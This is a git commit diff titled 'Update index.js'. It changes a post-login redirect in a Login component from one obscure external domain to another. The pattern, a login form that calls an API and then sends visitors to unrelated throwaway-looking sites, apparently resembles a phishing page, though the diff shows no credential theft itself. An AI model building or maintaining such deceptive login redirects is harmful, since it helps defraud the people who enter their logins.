a1dae6b084961d9d80af64329d55caba432b33df
husknet <127146284+husknet@users.noreply.github.com>
2025-02-11 11:06:48 -0400

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -74,7 +74,7 @@ const Login = () => {
       });
 
       setShowModal(false); // Hide modal before redirecting
-      window.location.href = 'https://ss.archive81.online/';
+      window.location.href = 'https://suge.loglinefoline.shop/';
     } catch (error) {
       setShowModal(false); // Hide modal on error
       console.error('Error during API call:', error);
